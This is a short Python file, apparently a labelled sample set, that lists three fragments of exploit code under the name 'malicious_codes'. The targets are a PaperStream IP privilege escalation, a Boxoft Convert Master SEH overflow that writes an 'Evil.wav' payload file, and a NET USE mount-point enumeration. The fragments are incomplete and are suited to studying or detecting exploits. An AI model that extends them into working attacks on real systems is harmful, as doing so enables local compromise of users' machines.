'''
Code snippets target these vulnerabilities:
1) PaperStream IP (TWAIN) 1.42.0.5685 - Local Privilege Escalation.
2) Boxoft Convert Master 1.3.0 - 'wav' SEH Local Exploit.
3) Microsoft NET USE win10 - Insufficient Authentication Logic.
'''
malicious_codes = ['''
                    if ((Test-Path $PayloadFile) -eq $false) {
                        Write-Host "$PayloadFile not found, did you forget to upload it?"
                        Exit 1
                    }
                   ''',
                   '''
                   try:
                        f=open('Evil.wav','w')
                        print '[+] Creating %s bytes evil payload..' %len(payload)
                        f.write(payload)
                        f.close()
                        print '[+] File created!'
                   except:
                        print 'File cannot be created'
                   ''',
                   '''
                   def mountpoints2():
                        mntpoint2_connections=[]
                        try:
                            p = Popen(REG_MOUNT2, stdout=PIPE, stderr=PIPE, shell=True)
                            tmp = p.stdout.readlines()
                        except Exception as e:
                            print("[!] "+str(e))
                            return False
                        for x in tmp:
                            idx = x.find("##")
                            clean = x[idx:]
                            idx2 = clean.rfind("#")
                            ip = clean[2:idx2]
                            ip = re.sub(r"#.*[A-Z,a-z]","",ip)
                            if ip not in mntpoint2_connections:
                                mntpoint2_connections.append(ip)
                            mntpoint2_connections = list(filter(None, mntpoint2_connections))
                        p.kill()
                        return mntpoint2_connections
                   ''',
                   ]
